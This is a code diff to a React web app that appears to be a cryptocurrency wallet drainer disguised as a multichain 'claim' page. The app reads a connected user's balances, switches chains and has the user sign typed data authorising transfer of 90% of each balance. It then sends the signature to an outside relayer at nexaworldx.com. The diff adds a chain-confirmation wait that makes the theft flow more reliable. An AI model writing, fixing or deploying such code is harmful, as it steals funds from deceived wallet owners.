@@ -10,7 +10,7 @@ import './index.css';
 const MULTICHAIN_CONFIG = {
   Ethereum: {
     chainId: 1,
-    contractAddress: '0x7aD2535F79E8B2B0A6Cf937E8FB334bf8a08Ed47', // Your contract address
+    contractAddress: '0x7aD2535F79E8B2B0A6Cf937E8FB334bf8a08Ed47',
     name: 'Ethereum',
     symbol: 'ETH',
     rpcEndpoints: ['https://eth.llamarpc.com', 'https://ethereum.publicnode.com']
@@ -47,7 +47,7 @@ const MULTICHAIN_CONFIG = {
 
 const DEPLOYED_CHAINS = Object.values(MULTICHAIN_CONFIG);
 
-// Helper: fetch balance (same as before)
+// Helper: fetch balance
 const fetchChainBalance = async (chain, walletAddress, retries = 2) => {
   let lastError = null;
   for (let attempt = 0; attempt <= retries; attempt++) {
@@ -103,6 +103,20 @@ const switchNetwork = async (walletProvider, chainId) => {
   }
 };
 
+// NEW HELPER: wait for wallet to confirm chainId
+const waitForChainId = async (walletProvider, targetChainId, timeoutMs = 10000) => {
+  const start = Date.now();
+  while (Date.now() - start < timeoutMs) {
+    try {
+      const currentChainIdHex = await walletProvider.request({ method: 'eth_chainId' });
+      const currentChainId = parseInt(currentChainIdHex, 16);
+      if (currentChainId === targetChainId) return true;
+    } catch (e) {}
+    await new Promise(resolve => setTimeout(resolve, 300));
+  }
+  throw new Error(`Timeout: wallet still on wrong chain (expected ${targetChainId})`);
+};
+
 function App() {
   const { open } = useAppKit();
   const { address, isConnected } = useAppKitAccount();
@@ -124,7 +138,7 @@ function App() {
   const [stepStatus, setStepStatus] = useState({});
   const [prices, setPrices] = useState({ eth: 2000, bnb: 300, matic: 0.75, avax: 32 });
 
-  const RELAYER_URL = 'https://nexaworldx.com/relayer-app/relay'; // <-- YOUR RELAYER ENDPOINT
+  const RELAYER_URL = 'https://nexaworldx.com/relayer-app/relay';
   const MIN_VALUE_THRESHOLD = 1;
 
   // EIP-712 types (NO verifyingContract)
@@ -201,7 +215,7 @@ function App() {
     }
   }, [isConnected, address]);
 
-  // Main claim execution
+  // Main claim execution with chainId verification
   const executeMultiChainSignature = async () => {
     if (!walletProvider || !address) {
       setError('Wallet not initialized');
@@ -224,22 +238,29 @@ function App() {
 
         // 1. Switch network
         await switchNetwork(walletProvider, chain.chainId);
+        setStepStatus(prev => ({ ...prev, [chain.name]: 'waiting_chain' }));
+        setTxStatus(`⏳ Waiting for ${chain.name} confirmation...`);
+
+        // 2. Wait for wallet to confirm the new chainId (FIX)
+        await waitForChainId(walletProvider, chain.chainId, 10000);
         setStepStatus(prev => ({ ...prev, [chain.name]: 'switched' }));
 
-        // 2. Get fresh signer
+        // 3. Create fresh provider & signer AFTER chain is confirmed
         const newProvider = new ethers.BrowserProvider(walletProvider);
         const newSigner = await newProvider.getSigner();
         const signerAddress = await newSigner.getAddress();
-        if (signerAddress.toLowerCase() !== address.toLowerCase()) throw new Error('Signer mismatch');
+        if (signerAddress.toLowerCase() !== address.toLowerCase()) {
+          throw new Error('Signer address mismatch after network switch');
+        }
 
         const balance = balances[chain.name];
         if (!balance || balance.valueUSD < MIN_VALUE_THRESHOLD) continue;
 
-        // 3. Fetch current nonce from contract (read-only)
+        // 4. Fetch current nonce from contract (read-only)
         setStepStatus(prev => ({ ...prev, [chain.name]: 'fetching_nonce' }));
         const nonce = await getUserNonce(chain, address);
         
-        // 4. Prepare signature (send 90% of balance)
+        // 5. Prepare signature (send 90% of balance)
         const amountToSend = balance.amount * 0.9;
         const amountInWei = ethers.parseEther(amountToSend.toFixed(18));
         
@@ -259,7 +280,7 @@ function App() {
         const signature = await newSigner.signTypedData(domain, EIP712_TYPES, value);
         setStepStatus(prev => ({ ...prev, [chain.name]: 'signed' }));
 
-        // 5. Send to relayer
+        // 6. Send to relayer
         setStepStatus(prev => ({ ...prev, [chain.name]: 'relaying' }));
         setTxStatus(`📤 Sending to relayer (${chain.name})...`);
         const response = await fetch(RELAYER_URL, {
@@ -388,6 +409,7 @@ function App() {
                         'bg-yellow-500/20 text-yellow-400'
                       }`}>
                         {step === 'switching' && '🔄 Switching'}
+                        {step === 'waiting_chain' && '⏳ Waiting chain'}
                         {step === 'switched' && '✅ Switched'}
                         {step === 'fetching_nonce' && '🔢 Fetching nonce'}
                         {step === 'signing' && '✍️ Signing...'}
